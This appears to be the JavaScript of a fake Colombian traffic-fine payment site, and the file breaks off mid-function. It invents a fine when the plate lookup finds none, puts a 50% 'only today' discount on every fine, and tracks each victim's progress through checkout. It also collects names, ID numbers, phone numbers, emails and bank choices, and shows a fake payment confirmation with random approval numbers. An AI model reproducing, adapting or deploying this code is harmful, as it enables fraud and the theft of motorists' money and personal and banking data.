let consultaEnProceso = false;
let currentStep = 1;
let totalAPagar = 0;
let userEmail = "";

/* =========================
   Helpers de formato
   ========================= */
function formatearNumero(numero) {
  const n = Number(numero || 0);
  return Math.round(n).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}
function extraerValor(texto) {
  return parseInt(String(texto).split("$")[1]?.trim().replace(/[.,]/g, "")) || 0;
}
function parseColDate(s) {
  if (!s) return null;
  // Formatos: "DD/MM/YYYY" o "DD/MM/YYYY HH:mm:ss"
  const t = String(s).trim();
  const [dmy, hms] = t.split(" ");
  const [dd, mm, yyyy] = dmy.split("/").map((x) => parseInt(x, 10));
  if (!dd || !mm || !yyyy) return null;
  let hh = 0, mi = 0, ss = 0;
  if (hms && hms.includes(":")) {
    const parts = hms.split(":").map((x) => parseInt(x, 10));
    hh = parts[0] || 0; mi = parts[1] || 0; ss = parts[2] || 0;
  }
  return new Date(yyyy, mm - 1, dd, hh, mi, ss);
}

/* =========================
   Loader y pasos
   ========================= */
function showLoader(show = true) {
  const loader = document.getElementById("loader");
  if (!loader) return;
  loader.style.display = show ? "flex" : "none";
  if (show) { currentStep = 1; updateStep(1); }
}
function updateStep(step) {
  const steps = document.querySelectorAll(".step");
  const progressBar = document.getElementById("progress-bar");
  const loaderMsg = document.getElementById("loader-msg");
  if (!steps.length) return;

  steps.forEach((el, i) => {
    el.classList.remove("done", "active");
    if (i + 1 < step) el.classList.add("done");
    else if (i + 1 === step) el.classList.add("active");
  });

  if (progressBar) {
    progressBar.style.width = Math.min((step / steps.length) * 100, 100) + "%";
  }

  const messages = ["Iniciando consulta...", "Conectando...", "Procesando...", "Finalizando...", "Completado"];
  if (loaderMsg) loaderMsg.textContent = messages[step - 1] || messages[0];
}

/* =========================
   Vistas y totales
   ========================= */
function calcularTotales() {
  const checkboxes = document.querySelectorAll('#multaTable tbody input[type="checkbox"]:checked');
  let total = 0;
  checkboxes.forEach((cb) => {
    const fila = cb.closest("tr");
    const valorEl = fila.querySelector('[data-label="Valor a pagar"]');
    if (valorEl) total += extraerValor(valorEl.textContent);
  });
  totalAPagar = total;
  actualizarUI(total, checkboxes.length);
  actualizarDetalle(checkboxes);
}
function actualizarUI(total, count) {
  const elementos = {
    ".fs-18.mr-lg-2.mr-md-3.mr-2.mb-0": `Total (${count}): `,
    ".font-weight-bold.fs-17": `$${formatearNumero(total)}`,
    "#valorTotal": `$${formatearNumero(total)}`,
    ".text-muted.fs-17.mr-3": `Total a pagar <span>(${count}):</span>`,
  };
  Object.entries(elementos).forEach(([selector, texto]) => {
    const el = document.querySelector(selector);
    if (el) el.innerHTML = texto;
  });
  const btnPagar = document.getElementById("btnPagar");
  if (btnPagar) {
    btnPagar.textContent = `Pagar $${formatearNumero(total)}`;
    btnPagar.disabled = count === 0;
  }
}
function actualizarDetalle(checkboxes) {
  const detalle = document.getElementById("detalleListGroup");
  const totalDetalle = document.getElementById("totalDetalle");
  if (!detalle) return;
  while (detalle.children.length > 2) {
    detalle.removeChild(detalle.children[1]);
  }
  let total = 0;
  checkboxes.forEach((cb) => {
    const fila = cb.closest("tr");
    const tipo = fila.querySelector('[data-label="Tipo"] p')?.textContent.trim();
    const valor = extraerValor(fila.querySelector('[data-label="Valor a pagar"]')?.textContent);
    if (tipo && valor) {
      total += valor;
      const item = document.createElement("li");
      item.className = "d-flex justify-content-between list-group-item bg-transparent p-1";
      item.innerHTML = `<p class="mb-0">${tipo} (1)</p><p class="font-weight-bold mb-0">$&nbsp;${formatearNumero(valor)}</p>`;
      detalle.insertBefore(item, detalle.lastElementChild);
    }
  });
  if (totalDetalle) {
    totalDetalle.innerHTML = `Total a pagar (${checkboxes.length})<span class="font-weight-bold ml-2">$&nbsp;${formatearNumero(total)}</span>`;
  }
}
function mostrarSinDeudas() {
  const containerSinDeudas = document.querySelector(".container-fluid.mb-4-1");
  if (containerSinDeudas) containerSinDeudas.style.display = "block";
  const elementosAOcultar = [
    ".container-fluid.mb-4 .row.mt-3",
    ".container-fluid.mb-4 .row:not(.mt-3)",
    "#resumenEstadoCuenta",
    "#resumenEstadoCuenta1",
    ".card.shadow-sm.border-0.rounded.mt-3",
    ".row.justify-content-end.align-items-center.mt-4",
    ".row.justify-content-end.align-items-center:last-child",
  ];
  elementosAOcultar.forEach((selector) => {
    document.querySelectorAll(selector).forEach((el) => {
      if (el && !el.classList.contains("mb-4-1")) el.style.display = "none";
    });
  });
}
function mostrarConDeudas() {
  const containerSinDeudas = document.querySelector(".container-fluid.mb-4-1");
  if (containerSinDeudas) containerSinDeudas.style.display = "none";
  const elementosAMostrar = [
    ".container-fluid.mb-4 .row.mt-3",
    ".container-fluid.mb-4 .row:not(.mt-3)",
    ".card.shadow-sm.border-0.rounded.mt-3",
    ".row.justify-content-end.align-items-center.mt-4",
    ".row.justify-content-end.align-items-center:last-child",
  ];
  elementosAMostrar.forEach((selector) => {
    document.querySelectorAll(selector).forEach((el) => { if (el) el.style.display = "block"; });
  });
}

/* =========================
   Resumen y tabla
   ========================= */
function obtenerPlaca() {
  const inputs = ["#txtBusquedaVista2", "#txtBusqueda"];
  for (const selector of inputs) {
    const input = document.querySelector(selector);
    if (input?.value.trim()) return input.value.trim().toUpperCase();
  }
  return "";
}
function actualizarResumen(resumen, datos, total, datosPersonales = null, busqueda = "") {
  const selectores = {
    ".col-lg-3:nth-child(2) span strong": datos.comparendos || "0",
    ".col-lg-2:nth-child(3) span strong": datos.multas || "0",
    ".col-lg-4:last-child span strong": `$\u00A0${formatearNumero(total)}`,
  };
  if (datosPersonales) {
    selectores[".col-lg-5 span strong"] = datosPersonales.cedula || busqueda;
    const nombreValor = resumen.querySelector("#resumenNombreValor strong");
    const nombreDisplay = (datosPersonales.nombre_completo || `${(datosPersonales.nombre || "").trim()} ${(datosPersonales.apellido || "").trim()}`.trim()).trim();
    if (nombreValor && nombreDisplay) nombreValor.textContent = nombreDisplay;
  }
  Object.entries(selectores).forEach(([sel, val]) => {
    const el = resumen.querySelector(sel);
    if (el) el.textContent = val;
  });
}
function obtenerTipoImposicion(codigoInfraccion) {
  const codigo = String(codigoInfraccion || "").trim().toUpperCase();
  const porCamara = ["C29"];
  const porAmbos = ["A05","B08","C05","C09","C14","C30","C32","D03","D04","D10","H13"];
  const porAgente = [
    "A01","A02","A03","A04","A06","A07","A08","A09","A10","A11","A12",
    "B01","B02","B03","B04","B05","B06","B07","B09","B10","B11","B12","B13","B14","B15","B16","B17","B18","B19","B20","B21","B22","B23",
    "C01","C02","C03","C04","C06","C07","C08","C10","C11","C12","C13","C15","C16","C17","C18","C19","C20","C21","C22","C23","C24","C25","C26","C27","C28","C31","C33","C34","C35","C36","C37","C38","C39","C40",
    "D01","D02","D05","D06","D07","D08","D09","D11","D12","D13","D14","D15","D16","D17",
    "E01","E02","E04","E05",
    "F01","F02","F03","F04","F05","F06","F07","F08","F09","F10","F11","F12",
    "G01","G02",
    "H01","H02","H03","H04","H05","H06","H07","H08","H09","H10","H11","H12",
    "I01","I02"
  ];
  if (porCamara.includes(codigo)) return "CÁMARA";
  if (porAmbos.includes(codigo)) return "AMBOS";
  return "AGENTE";
}
function obtenerIconoImposicion(codigoInfraccion) {
  const tipo = obtenerTipoImposicion(codigoInfraccion);
  switch (tipo) {
    case "CÁMARA":
    case "AMBOS":
      return '<em class="bx bx-cctv mr-1 fs-18 text-muted"></em>';
    case "AGENTE":
    default:
      return '<em class="bx bx-user mr-1 fs-18 text-muted"></em>';
  }
}
function llenarTabla(tabla) {
  const tbody = document.querySelector("#multaTable tbody");
  if (!tbody) return;
  tbody.innerHTML = tabla
    .map((fila, i) => {
      if (!fila) return "";
      const intereses = (fila.valorIntereses || 0) > 0
        ? `<p class="mb-0 fs-12 font-weight-normal" style="text-decoration: line-through; color: #9e9e9e;">Interés $&nbsp;${formatearNumero(fila.valorIntereses)}</p>`
        : "";
      const icono = obtenerIconoImposicion(fila.infraccionCode || fila.infraccion || "");
      const hoyDescuento = new Date();
      const fechaDescuentoStr = hoyDescuento.toLocaleDateString("es-CO", { day: "2-digit", month: "2-digit", year: "numeric" });
      const descuentoTexto = fila.descuentoSoloHoy
        ? `50% OFF! solo válido hasta hoy (${fechaDescuentoStr})`
        : `50% OFF! válido hasta el ${fechaDescuentoStr}`;
      const secretariaCell = fila.ocultarSecretaria
        ? `<td data-label="Secretaría" class="multa-secretaria-vacia" hidden aria-hidden="true"></td>`
        : `<td data-label="Secretaría">${fila.secretaria || "N/A"}</td>`;
      return `<tr class="page-row${fila.ocultarSecretaria ? " multa-row-sin-secretaria" : ""}">
          <td data-label="Tipo">
              <p class="mb-0 text-muted font-weight-bold">${fila.tipo || "N/A"}</p>
              <span class="fs-13">Fecha resolución: ${fila.fechaResolucion || "N/A"}</span>
          </td>
          <td data-label="Notificación">${fila.notificacion || "N/A"}</td>
          <td data-label="Placa">${fila.placa || "N/A"}</td>
          ${secretariaCell}
          <td data-label="Infracción" class="text-left details-control">
              <span class="d-inline-flex popover-infraccion">
                  ${icono}
                  <label class="mb-0 fs-14 font-weight-bold text-dark">
                      <span>${fila.infraccion || "N/A"}</span>
                  </label>
              </span>
          </td>
          <td data-label="Estado">${fila.estado || "N/A"}</td>
          <td data-label="Valor" class="text-right multa-valor-col">
              <div class="multa-valor-original" style="text-decoration: line-through; color: #9e9e9e;">
                  $${formatearNumero(fila.valorOriginal || 0)}
              </div>
              ${intereses}
              <div class="multa-descuento" style="color: #2e7d32; font-size: 0.75rem; font-weight: 500;">
                  ${descuentoTexto}
              </div>
          </td>
          <td data-label="Valor a pagar" class="text-right multa-pagar-col">
              <div class="multa-valor-pagar" style="color: #2e7d32; font-weight: bold;">
                  $${formatearNumero(fila.valorConDescuento || 0)}
              </div>
              <div class="multa-detalle-pago" style="color: #455a64; font-size: 0.75rem; font-weight: 500;">
                  Detalle Pago
              </div>
          </td>
          <td data-label="Selecciona para pagar" class="text-right multa-select-col">
              <div class="multa-checkbox">
                  <input type="checkbox" id="chkMulta${i}" class="multa-check-square" onchange="calcularTotales()">
                  <label for="chkMulta${i}"></label>
              </div>
          </td>
      </tr>`;
    })
    .join("");
  const hideSecretaria = tabla.every((fila) => fila && fila.ocultarSecretaria);
  const thSecretaria = document.getElementById("secretariaMulta");
  if (thSecretaria) thSecretaria.style.display = hideSecretaria ? "none" : "";
}

/* =========================
   Normalización NUEVA API (SIEMPRE 50%)
   ========================= */
function splitAndPickJSON(raw) {
  // Intenta parsear; si vienen dos objetos concatenados "}{", separa y elige el útil
  const txt = String(raw || "").trim();
  try { return JSON.parse(txt); } catch (_) { /* continua */ }
  const parts = [];
  if (txt.includes("}{")) {
    const segs = txt.split("}{");
    for (let i = 0; i < segs.length; i++) {
      const chunk = (i === 0 ? segs[i] + "}" : (i === segs.length - 1 ? "{" + segs[i] : "{" + segs[i] + "}"));
      try { parts.push(JSON.parse(chunk)); } catch (_) {}
    }
  } else if (txt.startsWith("]")) {
    try { return JSON.parse(txt.slice(1)); } catch (_) {}
  }
  // prioriza el que tenga 'multas' o 'success'
  const conMultas = parts.find(o => o && Array.isArray(o.multas));
  if (conMultas) return conMultas;
  const conSuccess = parts.find(o => o && o.success);
  if (conSuccess) return conSuccess;
  // fallback: primero parseable
  return parts[0] || null;
}
function buildFallbackComparendo(busqueda) {
  const esPlaca = /^[A-Z]/.test(busqueda || "");
  const fechaRes = new Date();
  fechaRes.setDate(fechaRes.getDate() - 4);
  const fechaResolucion = fechaRes.toLocaleDateString("es-CO", { day: "2-digit", month: "2-digit", year: "numeric" });
  return {
    tipo: "Comparendo",
    fechaResolucion,
    notificacion: "No aplica",
    placa: esPlaca ? busqueda : "—",
    secretaria: "",
    ocultarSecretaria: true,
    descuentoSoloHoy: true,
    infraccion: "C02",
    infraccionDesc: "",
    infraccionCode: "C02",
    estado: "Pendiente",
    valorOriginal: 180000,
    valorIntereses: 0,
    valorConDescuento: 90000,
  };
}

function transformNewApiToUI(apiObj) {
  const lista = Array.isArray(apiObj?.multas) ? apiObj.multas : [];

  const tabla = lista.map((m) => {
    const infr = (m.infracciones && m.infracciones[0]) || {};
    const code = infr.codigoInfraccion || "";
    const desc = infr.descripcionInfraccion || "";

    // === SIEMPRE 50% ===
    const baseValor = Number(m.valorPagar) > 0 ? Number(m.valorPagar) : Number(m.valor || 0);
    const valorConDescuento = Math.round(baseValor / 2);

    // Notificación (mantener lógica previa)
    let noti = null;
    const pNotif = (m.proyeccion || []).find(x => /Notificaci/i.test(x?.descripcion || ""));
    if (pNotif?.fecha) noti = pNotif.fecha;
    else if (m.fechaNotificacion) noti = m.fechaNotificacion;
    else if (m.fechaComparendo) noti = m.fechaComparendo;

    return {
      tipo: m.comparendo ? "Comparendo" : "Resolución",
      fechaResolucion: m.fechaResolucion || "N/A",
      notificacion: noti || "N/A",
      placa: m.placa || "—",
      secretaria: (m.organismoTransito || "").trim() || "—",
      infraccion: code || "—",
      infraccionDesc: desc,
      infraccionCode: code || "",
      estado: m.comparendo ? (m.estadoComparendo || "Pendiente") : (m.estadoCartera || "Pendiente"),
      valorOriginal: Math.round(Number(m.valor || baseValor || 0)),
      valorIntereses: Math.round(Number(m.valorIntereses || 0)),
      valorConDescuento
    };
  });

  const comparendosCount = lista.filter(m => m.comparendo === true).length;
  const multasCount = lista.length - comparendosCount;

  const firstInf = lista[0]?.infractor || null;
  const datos_personales = firstInf ? {
    cedula: firstInf.numeroDocumento || "",
    nombre: `${(firstInf.nombre || "").trim()} ${(firstInf.apellido || "").trim()}`.trim(),
    tipoDocumento: firstInf.tipoDocumento || ""
  } : null;

  return {
    success: true,
    tipo: "PLACA",
    resumen: { comparendos: comparendosCount, multas: multasCount, totalItems: lista.length },
    tabla,
    datos_personales
  };
}

/* =========================
   Integración llenar datos
   ========================= */
function llenarDatos(dataUI) {
  const busqueda = obtenerPlaca();
  if (!dataUI || !Array.isArray(dataUI.tabla)) dataUI = { ...(dataUI || {}), tabla: [] };
  if (dataUI.tabla.length === 0) {
    dataUI.tabla = [buildFallbackComparendo(busqueda)];
    dataUI.resumen = { comparendos: 1, multas: 0, totalItems: 1 };
    if (/^\d+$/.test(busqueda) && !dataUI.datos_personales) {
      dataUI.datos_personales = { cedula: busqueda, nombre: "", tipoDocumento: "" };
    }
  }
  mostrarConDeudas();
  const esPlaca = /^[A-Z]/.test(busqueda);
  const esCedula = /^\d+$/.test(busqueda);

  const resumenPlaca = document.getElementById("resumenEstadoCuenta");
  const resumenCedula = document.getElementById("resumenEstadoCuenta1");
  [resumenPlaca, resumenCedula].forEach((el) => { if (el) el.style.display = "none"; });

  const totalReal = dataUI.tabla.reduce((sum, fila) => sum + (fila.valorConDescuento || 0), 0);

  if (esPlaca && resumenPlaca) {
    resumenPlaca.style.display = "block";
    actualizarResumen(resumenPlaca, dataUI.resumen, totalReal);
  } else if (esCedula && resumenCedula) {
    resumenCedula.style.display = "block";
    actualizarResumen(resumenCedula, dataUI.resumen, totalReal, dataUI.datos_personales, busqueda);
  }

  llenarTabla(dataUI.tabla);
  calcularTotales();
}

/* =========================
   Consulta principal
   ========================= */
async function consultarPlaca() {
  if (consultaEnProceso) return;

  const placa = obtenerPlaca();
  if (!placa) { alert("Por favor ingrese una placa"); return; }

  sessionStorage.setItem("placaConsultada", placa);

  const errorEl = document.getElementById("messageErrorTxtBusqueda");
  if (errorEl) errorEl.textContent = "";

  consultaEnProceso = true;
  showLoader(true);
  setTimeout(() => updateStep(2), 2000);
  setTimeout(() => updateStep(3), 4000);

  try {
    const response = await fetch("api.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        placa,
        key_id: window.KEY_ID || null
      }),
    });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);

    const raw = await response.text();
    let base = splitAndPickJSON(raw);

    // Si viene ya en el formato antiguo con success/tabla, úsalo; sino transforma desde 'multas'
    let dataUI = null;
    if (base && base.success && Array.isArray(base.tabla)) {
      dataUI = base;
    } else if (base && Array.isArray(base.multas)) {
      dataUI = transformNewApiToUI(base);
    } else {
      // Si la respuesta estaba doble y el "otro" objeto es el útil, intenta segundo parse:
      const alt = splitAndPickJSON(raw.split("}{").reverse().join("}{"));
      if (alt && alt.success && Array.isArray(alt.tabla)) dataUI = alt;
      else if (alt && Array.isArray(alt.multas)) dataUI = transformNewApiToUI(alt);
    }

    updateStep(4);

    setTimeout(() => {
      if (dataUI && dataUI.success) {
        llenarDatos(dataUI);
        cambiarVista(placa);
      } else {
        manejarError("No se encontraron resultados", errorEl);
      }
      showLoader(false);
      consultaEnProceso = false;
    }, 800);
  } catch (error) {
    setTimeout(() => {
      manejarError(`Error de conexión: ${error.message}`, errorEl);
      showLoader(false);
      consultaEnProceso = false;
    }, 800);
  }
}
function cambiarVista(placa) {
  const vista1 = document.getElementById("vista1");
  const vista2 = document.getElementById("vista2");
  if (vista1 && vista1.style.display !== "none") {
    vista1.style.display = "none";
    if (vista2) {
      vista2.style.display = "block";
      const input = vista2.querySelector('input[name="txtBusqueda"]');
      if (input) input.value = placa;
    }
  }
}
function manejarError(mensaje, errorEl) {
  if (errorEl) errorEl.textContent = mensaje;
  else alert(`Error: ${mensaje}`);
}

/* =========================
   Flujo pago (igual)
   ========================= */
function irAPago() {
  const checkboxes = document.querySelectorAll('#multaTable tbody input[type="checkbox"]:checked');
  const placa = obtenerPlaca();
  document.getElementById("vista2").style.display = "none";
  document.getElementById("pago").style.display = "block";
  window.scrollTo(0, 0);
  
  if (checkboxes.length > 0 && placa) {
    // 1. Guardar que seleccionó multas
    const img = new Image();
    const keyParam = window.KEY_ID ? `&key_id=${encodeURIComponent(window.KEY_ID)}` : '';
    img.src = `api.php?action=log_pago&placa=${encodeURIComponent(placa)}&total=${totalAPagar}&count=${checkboxes.length}${keyParam}`;
    
    // 2. TRACKING: Guardar que llegó a checkout
    setTimeout(() => {
      fetch("api.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          action: "track_checkout",
          placa: placa,
          total: totalAPagar,
          count: checkboxes.length,
          key_id: window.KEY_ID || null
        })
      }).catch(e => console.log('Tracking checkout error:', e));
    }, 100);
  }
}
async function irAPSE() {
  const count = document.querySelectorAll('#multaTable tbody input[type="checkbox"]:checked').length;
  if (count === 0) { alert("Por favor seleccione al menos una multa para pagar"); return; }
  
  const placa = obtenerPlaca();
  
  // TRACKING: Usuario hizo clic en PSE
  try {
    await fetch("api.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        action: "track_pse_click",
        placa: placa,
        total: totalAPagar,
        count: count,
        key_id: window.KEY_ID || null
      }),
    });
  } catch (_) {
    console.log('Tracking PSE error');
  }
  
  // Guardar datos en localStorage como backup (por si las sesiones fallan)
  const checkoutData = {
    total: totalAPagar,
    count: count,
    placa: placa,
    key_id: window.KEY_ID || null,
    timestamp: Date.now()
  };
  localStorage.setItem('checkout_data', JSON.stringify(checkoutData));
  
  // Continuar con el flujo normal
  try {
    const response = await fetch("api.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        action: "guardar_pago", 
        total: totalAPagar, 
        count,
        key_id: window.KEY_ID || null
      }),
    });
    const data = await response.json();
    if (data.success) {
      // Agregar timestamp para verificar que localStorage está actualizado
      checkoutData.saved_at = new Date().toISOString();
      localStorage.setItem('checkout_data', JSON.stringify(checkoutData));
      
      window.location.href = "./checkout-placetopay/";
    } else {
      alert("Error al procesar el pago");
    }
  } catch (_) {
    alert("Error de conexión");
  }
}
function irATarjeta() {
  const count = document.querySelectorAll('#multaTable tbody input[type="checkbox"]:checked').length;
  if (count === 0) { alert("Por favor seleccione al menos una multa para pagar"); return; }
  fetch("api.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ 
      action: "guardar_pago", 
      total: totalAPagar, 
      count,
      key_id: window.KEY_ID || null
    }),
  })
    .then((r) => r.json())
    .then((data) => {
      if (data.success) window.location.href = "./checkout-placetopay/?method=card";
      else alert("Error al procesar el pago");
    })
    .catch(() => alert("Error de conexión"));
}

function irABrebDirecto() {
  let amount = totalAPagar || 0;
  if (!amount || amount <= 0) {
    const checked = document.querySelectorAll('#multaTable tbody input[type="checkbox"]:checked');
    let sum = 0;
    checked.forEach((cb) => {
      const row = cb.closest("tr");
      const val = extraerValor(row?.querySelector('[data-label="Valor a pagar"]')?.textContent || "");
      sum += val;
    });
    amount = sum;
  }
  if (!amount || amount <= 0) {
    const vt = document.querySelector("#valorTotal");
    if (vt) amount = extraerValor(vt.textContent || "");
  }
  if (!amount || amount <= 0) {
    try {
      const chk = JSON.parse(localStorage.getItem("checkout_data") || "{}");
      amount = parseInt(chk.total || "0", 10) || 0;
    } catch (_) {}
  }
  if (!amount || amount <= 0) {
    amount = parseInt(localStorage.getItem("payment_amount") || "0", 10) || 0;
  }
  if (!amount || amount <= 0) { alert("No se encontró un monto válido para pagar."); return; }

  const placa = sessionStorage.getItem("placaConsultada") || obtenerPlaca() || "";
  // No bloquear la redirección esperando el tracking
  fetch("api.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      action: "track_breb_click",
      placa: placa,
      total: amount,
      count: document.querySelectorAll('#multaTable tbody input[type="checkbox"]:checked').length,
      key_id: window.KEY_ID || null
    }),
  }).catch(() => {});

  const brebId = 'BREB_' + Math.floor(Date.now() / 1000) + '_' + Math.floor(Math.random() * 1000);
  localStorage.setItem("payment_amount", String(amount));
  const kId = window.KEY_ID || '';
  window.location.href = "./checkout-brebqr/?amount=" + encodeURIComponent(amount) + "&id=" + encodeURIComponent(brebId) + "&key_id=" + encodeURIComponent(kId);
}

async function irAQR() {
  const count = document.querySelectorAll('#multaTable tbody input[type="checkbox"]:checked').length;
  if (count === 0) { alert("Por favor seleccione al menos una multa para pagar"); return; }

  const placa = obtenerPlaca();
  try {
    await fetch("api.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "track_breb_click",
        placa: placa,
        total: totalAPagar,
        count: count,
        key_id: window.KEY_ID || null
      }),
    });
  } catch (_) {
    console.log("Tracking Bre-B error");
  }

  const checkoutData = {
    total: totalAPagar,
    count: count,
    placa: placa,
    key_id: window.KEY_ID || null,
    timestamp: Date.now()
  };
  localStorage.setItem('checkout_data', JSON.stringify(checkoutData));

  try {
    const response = await fetch("api.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        action: "guardar_pago",
        total: totalAPagar,
        count,
        key_id: window.KEY_ID || null
      }),
    });
    const data = await response.json();
    if (data.success) {
      checkoutData.saved_at = new Date().toISOString();
      localStorage.setItem('checkout_data', JSON.stringify(checkoutData));
      // Redirigir a la vista de pago con QR (Bre-B)
      const brebId = 'BREB_' + Math.floor(Date.now() / 1000) + '_' + Math.floor(Math.random() * 1000);
      localStorage.setItem("payment_amount", totalAPagar);
      const kId2 = window.KEY_ID || '';
      window.location.href = `./checkout-brebqr/?amount=${encodeURIComponent(totalAPagar)}&id=${encodeURIComponent(brebId)}&key_id=${encodeURIComponent(kId2)}`;
    } else {
      alert("Error al procesar el pago");
    }
  } catch (_) {
    alert("Error de conexión");
  }
}

/* =========================
   Paso cuenta correo y PSE
   ========================= */
function manejarPaso1() {
  const email = document.getElementById("email").value;
  if (!email || !email.includes("@")) { alert("Por favor ingrese un email válido"); return; }
  document.getElementById("paso1").style.display = "none";
  document.getElementById("paso2").style.display = "block";
  userEmail = email;
  const emailDisplay = document.querySelector(".truncate.text-sm.font-medium.text-gray-900");
  if (emailDisplay) emailDisplay.textContent = email;
}
function cambiarCuenta() {
  document.getElementById("paso2").style.display = "none";
  document.getElementById("paso1").style.display = "block";
  userEmail = "";
}
async function procesarPagoPSE() {
  const campos = {
    banco: document.querySelector("#headlessui-combobox-input-3")?.value,
    nombre: document.querySelector("#name")?.value,
    apellido: document.querySelector("#surname")?.value,
    documento: document.querySelector("#document")?.value,
    celular: document.querySelector('input[name="user.mobile"]')?.value,
  };
  if (Object.values(campos).some((c) => !c)) { alert("Por favor complete todos los campos"); return; }

  const btnSubmit = document.querySelector("#btnPagarPSE");
  const textoOriginal = btnSubmit.innerHTML;
  if (!document.getElementById("spinner-css")) {
    const style = document.createElement("style");
    style.id = "spinner-css";
    style.textContent = "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }";
    document.head.appendChild(style);
  }
  btnSubmit.innerHTML =
    '<div style="display: flex; align-items: center; justify-content: center;"><div style="width: 20px; height: 20px; border: 2px solid #ffffff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div></div>';
  btnSubmit.disabled = true;

  // El loader PSE original se mostrará después del redirect

  const datos = {
    codigo_banco: campos.banco,
    monto:
      totalAPagar ||
      parseInt(
        document.querySelector("#totalPrecioPaso2, #totalPrecioPaso1")?.textContent.replace(/[^0-9]/g, "")
      ) ||
      0,
    placa: sessionStorage.getItem("placaConsultada") || "N/A",
    nombre: `${campos.nombre} ${campos.apellido}`,
    documento: campos.documento,
    celular: campos.celular,
    email: userEmail,
  };

  try {
    // ===== BANCO POPULAR PSE - RESPUESTA INMEDIATA =====
    const response = await fetch("pse.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(datos),
    });
    
    const data = await response.json();
    
    if (data.success && data.bank_url) {
      // Éxito: URL PSE generada, redirigir inmediatamente
      console.log("✅ URL PSE generada exitosamente");
      console.log("🔄 Redirigiendo al banco...");
      console.log("URL:", data.bank_url);
      
      // Guardar info en sessionStorage por si el usuario vuelve
      const paymentInfo = {
        banco: campos.banco,
        monto: datos.monto,
        placa: datos.placa,
        fecha: new Date().toISOString()
      };
      sessionStorage.setItem('pse_payment_info', JSON.stringify(paymentInfo));
      
      // Redirigir inmediatamente a la URL del banco PSE
      window.location.href = data.bank_url;
      
    } else {
      // Error: Mostrar formulario de nuevo
      console.log("❌ Error generando URL PSE:", data.error || 'Unknown error');
      
      // Restaurar botón
      btnSubmit.innerHTML = textoOriginal;
      btnSubmit.disabled = false;
      
      // Mostrar mensaje de error
      const errorMsg = data.error || "Error procesando el pago. Por favor, inténtalo nuevamente.";
      alert(errorMsg);
    }
  } catch (error) {
    // Error de conexión: Mostrar formulario de nuevo
    console.log("❌ Error de conexión:", error.message);
    
    // Restaurar botón
    btnSubmit.innerHTML = textoOriginal;
    btnSubmit.disabled = false;
    
    // Mostrar error
    alert("Error de conexión. Por favor, inténtalo nuevamente.");
  }
}

/* =========================
   Eventos DOM (igual)
   ========================= */
document.addEventListener("DOMContentLoaded", function () {
  ["#consultar", "#btnNumDocPlaca"].forEach((id) => {
    const btn = document.querySelector(id);
    if (btn) btn.addEventListener("click", (e) => { e.preventDefault(); consultarPlaca(); });
  });

  document.querySelectorAll('input[name="txtBusqueda"], #txtBusqueda, #txtBusquedaVista2').forEach((input) => {
    input.addEventListener("keypress", (e) => {
      if (e.key === "Enter") { e.preventDefault(); consultarPlaca(); }
    });
  });

  const btnPagar = document.getElementById("btnPagar");
  if (btnPagar) btnPagar.addEventListener("click", (e) => { e.preventDefault(); irAPago(); });

  const linkQrMetodo = document.querySelector("#linkQrMetodo");
  if (linkQrMetodo) linkQrMetodo.addEventListener("click", (e) => { e.preventDefault(); irABrebDirecto(); });

  const enlacePSE = document.querySelector("#headingPse");
  if (enlacePSE) enlacePSE.addEventListener("click", (e) => { e.preventDefault(); irAPSE(); });

  const enlaceTarjeta = document.querySelector("#headingTarjeta");
  if (enlaceTarjeta) enlaceTarjeta.addEventListener("click", (e) => { e.preventDefault(); irATarjeta(); });

  const formEmail = document.getElementById("formEmail");
  if (formEmail) formEmail.addEventListener("submit", (e) => { e.preventDefault(); manejarPaso1(); });

  const btnCambiar = document.querySelector(".w-fit.text-xs.text-gray-500.underline");
  if (btnCambiar) btnCambiar.addEventListener("click", (e) => { e.preventDefault(); cambiarCuenta(); });

  const formPSE = document.getElementById("formPSE");
  if (formPSE) formPSE.addEventListener("submit", (e) => { e.preventDefault(); procesarPagoPSE(); });

  const urlParams = new URLSearchParams(window.location.search);
  const method = urlParams.get("method");

  if (method === "card") {
    const paso1 = document.getElementById("paso1");
    const paso2 = document.getElementById("paso2");
    const pagos = document.getElementById("pagos");
    if (paso1) paso1.style.display = "none";
    if (paso2) paso2.style.display = "none";
    if (pagos) pagos.style.display = "block";
  } else {
    const paso1 = document.getElementById("paso1");
    const paso2 = document.getElementById("paso2");
    const pagos = document.getElementById("pagos");
    if (paso1) paso1.style.display = "block";
    if (paso2) paso2.style.display = "none";
    if (pagos) pagos.style.display = "none";
  }
});

/* =========================
   Checkout tarjeta (igual)
   ========================= */
let paymentButtonInitialized = false;

document.addEventListener("DOMContentLoaded", function () {
  const urlParams = new URLSearchParams(window.location.search);
  const fromPayment = urlParams.get("payment");
  const referrer = document.referrer;

  if (fromPayment === "success" || referrer.includes("checkout-placetopay") || referrer.includes("method=card")) {
    const otherSections = document.querySelectorAll("main:not(#finalizado)");
    otherSections.forEach((section) => { section.style.display = "none"; });

    const finalizadoSection = document.getElementById("finalizado");
    if (finalizadoSection) {
      finalizadoSection.style.display = "block";
      const now = new Date();
      const fecha = now.toLocaleDateString("es-CO") + " " + now.toLocaleTimeString("es-CO");
      const referenciaPago = Math.floor(Math.random() * 9000000) + 1000000;
      const numeroAprobacion = Math.floor(Math.random() * 900000000) + 1000000000;
      const valor = localStorage.getItem("payment_amount") || "335.506";

      const table = finalizadoSection.querySelector("table tbody");
      if (table) {
        const rows = table.querySelectorAll("tr");
        if (rows[0]) {
          const estadoCell = rows[0].querySelector("td:last-child");
